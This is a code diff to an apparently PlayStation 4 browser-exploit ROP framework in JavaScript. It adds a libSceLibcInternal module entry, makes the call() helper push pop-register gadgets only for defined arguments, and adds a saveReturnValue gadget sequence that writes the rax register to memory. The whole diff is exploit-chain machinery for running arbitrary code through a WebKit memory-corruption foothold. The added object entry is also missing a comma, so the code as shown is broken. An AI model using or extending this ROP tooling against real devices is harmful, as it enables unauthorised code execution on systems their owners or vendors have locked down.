@@ -3,6 +3,7 @@ var moduleBaseAddresses =
 {
   'libkernel': 0,
   'libSceWebKit2': 0
+  'libSceLibcInternal': 0
 };
 
 /* Simply adds given offset to given module's base address */
@@ -52,20 +53,50 @@ var rop = function(p) {
   /* Sets up a function call into a module by address */
   this.call = function (rip, rdi, rsi, rdx, rcx, r8, r9)
   {
-    this.push(window.gadgets["pop rdi"]);
-    this.push(rdi);
-    this.push(window.gadgets["pop rsi"]);
-    this.push(rsi);
-    this.push(window.gadgets["pop rdx"]);
-    this.push(rdx);
-    this.push(window.gadgets["pop rcx"]);
-    this.push(rcx);
-    this.push(window.gadgets["pop r8"]);
-    this.push(r8);
-    this.push(window.gadgets["pop r9"]);
-    this.push(r9);
+    if(rdi != undefined)
+    {
+      this.push(window.gadgets["pop rdi"]);
+      this.push(rdi);
+    }
+
+    if(rsi != undefined)
+    {
+      this.push(window.gadgets["pop rsi"]);
+      this.push(rsi);
+    }
+
+    if(rdx != undefined)
+    {
+      this.push(window.gadgets["pop rdx"]);
+      this.push(rdx);
+    }
+
+    if(rcx != undefined)
+    {
+      this.push(window.gadgets["pop rcx"]);
+      this.push(rcx);
+    }
+
+    if(r8 != undefined)
+    {
+      this.push(window.gadgets["pop r8"]);
+      this.push(r8);
+    }
+
+    if(r9 != undefined)
+    {
+      this.push(window.gadgets["pop r9"]);
+      this.push(r9);
+    }
+
     this.push(rip);
     return this;
+  }
+  this.saveReturnValue = function(where)
+  {
+    this.push(window.gadgets["pop rdi"]);
+    this.push(where);
+    this.push(window.gadgets["mov qword ptr [rdi], rax"]);
   }
 
   /* Loads the ROP chain and initializes it */
